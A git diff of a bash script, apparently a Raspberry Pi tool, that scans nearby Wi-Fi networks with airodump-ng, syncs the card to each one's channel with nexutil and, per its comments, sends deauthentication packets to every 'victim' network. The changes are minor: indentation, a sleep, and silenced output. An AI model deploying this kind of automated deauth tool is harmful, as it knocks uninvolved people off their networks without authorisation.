@@ -66,7 +66,7 @@ menu()
 		0 )
 			#remove startup entry
 			sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
-		;;
+			;;
 
 		1 )
 			enable_autologin
@@ -76,7 +76,7 @@ menu()
 		2 )
 			disable_autologin
 			menu
-		;;
+			;;
 
 		3 )
 			echo
@@ -153,8 +153,10 @@ haki()
 			channel=$(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 | sed -n "${i}{p;q;}")
 
 			echo "	[+] Synchronising card to channel: $channel"
+			#wait before sync'ing, because if it's done fast, the ioctrl of the driver goes crazy
+			sleep 2
 			#sync the card to the victim's channel
-			nexutil -k$channel
+			nexutil -k$channel > /dev/null 2>&1
 
 			echo "	[+] Attacking $essid"
 			#send some deauth packets to each wifi network
@@ -183,7 +185,7 @@ scan()
 	scan_interval=$1
 
 	#start data dumping in the background every n seconds
-	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval &
+	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval > /dev/null 2>&1 &
 
 	#add an initial hysteresis before starting in order to have data ready
 	sleep $scan_interval
